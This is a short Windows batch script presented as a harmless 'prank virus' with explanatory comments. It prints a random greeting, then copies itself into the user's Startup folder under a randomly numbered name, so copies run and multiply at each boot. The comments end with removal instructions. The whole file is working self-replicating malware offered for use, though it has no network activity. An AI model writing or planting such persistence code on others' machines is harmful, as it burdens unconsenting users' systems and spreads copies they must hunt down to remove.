@echo off
::HELLo by PotaJoe
::This "virus" is harmless, and easy to remove for anyone who knows what they're doing. If it causes any serious damage or inconvenience, it has likely been modified.

::Now, let's get into it.
::First, we need to pick what phrase will show up...
set /a phrase=(%RANDOM%*4/32768)+0
goto %phrase%
::Then we print it to the screen...
:0
echo Hello!
goto dup

:1
echo Hi!
goto dup

:2
echo Good Day!
goto dup

:3
echo Greetings!
goto dup

:4
echo Hiya!
goto dup

::Now we duplicate the file into the start menu folder, so that the program runs (and duplicates itself) every time the computer starts up.
:dup
set /a filenumber=(%RANDOM%)
set /a filename=Test
XCOPY "%~f0" "%appdata%\microsoft\windows\start menu\programs\startup\Hello%filenumber%.bat"* /Y
PAUSE
::And we're done!
::By the way, to remove it from your computer, navigate to the startup folder and remove any filles starting with "Hello".
